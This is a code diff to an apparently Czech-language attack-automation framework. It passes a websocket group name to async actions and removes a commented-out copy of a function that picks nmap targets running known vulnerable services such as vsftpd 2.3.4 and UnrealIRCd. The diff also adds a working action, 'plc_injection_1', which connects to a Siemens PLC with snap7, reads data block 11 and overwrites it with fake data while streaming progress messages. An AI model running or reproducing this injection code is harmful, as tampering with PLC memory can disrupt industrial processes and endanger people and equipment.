@@ -39,7 +39,7 @@ async def execute_python_action(action, parameters, context, group_name):
     try:
         # Rozlišíme, zda funkce je async nebo sync
         if asyncio.iscoroutinefunction(func):
-            result = await func(parameters, context)
+            result = await func(parameters, context, group_name)
         else:
             result = func(parameters, context)
         
@@ -100,79 +100,6 @@ def parse_nmap_output_for_IPs(parameters, context):
     return ip_string
 
 
-# @register_python_action("parse_nmap_services_for_vulns")
-# def parse_nmap_services_for_vulns(parameters, context):
-#     """
-#     Projde nmap service scan (uložený v context[scan_output_key]) a hledá definované 
-#     signatury, např. "UnrealIRCd" na portu 6667. Pokud najde, uloží do context["target_ip"] 
-#     IP té služby, a vrátí "192.168.50.8" (příklad).
-    
-#     Parametry:
-#       - scan_output_key (str) = klíč, kde je uložen syrový text z nmap -sV
-#       - patterns (dict) = slovník { "unreal_ircd": "UnrealIRCd", "vsftpd": "vsftpd 2.3.4", ... }
-#          Můžeš definovat víc signatur, podle kterých hledáš potenciální cíl.
-
-#     Příklad usage:
-#       parameters = {
-#         "scan_output_key": "service_scan_output",
-#         "patterns": {
-#           "unreal_ircd": "UnrealIRCd",
-#           "vsftpd": "vsftpd 2.3.4"
-#         }
-#       }
-#     Návrat: IP adresa (string) nebo None/prazdny text, 
-#             plus uloží do context["target_ip"].
-#     """
-#     scan_key = parameters.get("scan_output_key", "service_scan_output")
-#     raw_output = context.get(scan_key, "")
-#     if not raw_output:
-#         return "Chybí nmap service scan output"
-
-#     # Předpokládaná struktura 'patterns' je dict 
-#     # (např. { "unreal_ircd": "UnrealIRCd", "vsftpd": "vsftpd 2.3.4" })
-#     patterns = parameters.get("patterns", {})
-
-#     # Regulárně procházíme řádky typu:
-#     # "Nmap scan report for 192.168.50.8
-#     # 6667/tcp open  irc     UnrealIRCd 3.2.8.1"
-#     # Typicky to vypadá: "PORT   STATE SERVICE VERSION"
-
-#     # Budeme si pamatovat ip => text o službách
-#     ip_services = {}
-#     current_ip = None
-
-#     for line in raw_output.splitlines():
-#         line = line.strip()
-#         # Hledáme řádek "Nmap scan report for <IP>"
-#         m = re.match(r"Nmap scan report for (\S+)", line)
-#         if m:
-#             current_ip = m.group(1)
-#             ip_services[current_ip] = []
-#         else:
-#             # Pokud je to řádek s portem / službou, přidáme do ip_services[current_ip]
-#             if current_ip:
-#                 ip_services[current_ip].append(line)
-
-#     # Nyní máme ip_services = { "192.168.50.8": ["21/tcp open ftp vsftpd 2.3.4", "6667/tcp open irc UnrealIRCd 3.2.8.1", ...], ... }
-
-#     # Budeme hledat, jestli některý z definovaných 'patterns' se vyskytuje v textu
-#     # a pokud ano, vybereme tu IP jako target
-#     found_ip = None
-#     for ip, lines in ip_services.items():
-#         joined = " ".join(lines)  # seřadíme řádky dohromady
-#         for label, pattern in patterns.items():
-#             if pattern.lower() in joined.lower():
-#                 # Našli jsme hledaný string => považujeme to za zranitelné
-#                 found_ip = ip
-#                 break
-#         if found_ip:    
-#             break
-
-#     if found_ip:
-#         return found_ip
-#     else:
-#          return (False, "Nebyly nalezeny definované signatury z patterns")
-
 @register_python_action("parse_nmap_services_for_vulns")
 def parse_nmap_services_for_vulns(parameters, context):
     """
@@ -226,3 +153,41 @@ def parse_nmap_services_for_vulns(parameters, context):
     else:
         # Nenašli jsme nic => fail
         return (False, "Nebyly nalezeny definované patterny")
+
+@register_python_action("plc_injection_1")
+async def plc_injection_1(parameters, context, group_name):
+        
+    import snap7
+    target_ip = parameters.get("target_ip")
+    
+    if not target_ip:
+        raise ValueError("Missing 'target_ip' in parameters.")
+    
+    myplc = snap7.client.Client()
+    myplc.connect(target_ip, 0, 2)
+    
+    # print("Připojeno k PLC:", myplc.get_connected())
+    # print("CPU stav:", myplc.get_cpu_state())
+    
+
+    await send_to_websocket(group_name, f"Připojeno k PLC: {myplc.get_connected()}")
+    await send_to_websocket(group_name, f"CPU stav: {myplc.get_cpu_state()}")
+    
+
+    data = myplc.db_read(11, 0, 1)
+    # print("Original DB data:", data)
+    await send_to_websocket(group_name, f"Původní DB data: {data}")
+    
+    program_on = b'\x04'
+    fake_data = b'\x00'
+    
+    # print("Falešená data k zápisu:", fake_data)
+    await send_to_websocket(group_name, f"Falešná data k zápisu: {fake_data}")
+
+    # print("Type of program_on variable:", type(program_on))
+    
+    myplc.db_write(11, 0, fake_data)
+    await send_to_websocket(group_name, "Data úspěšně zapsána do PLC.")
+
+    
+    myplc.disconnect()
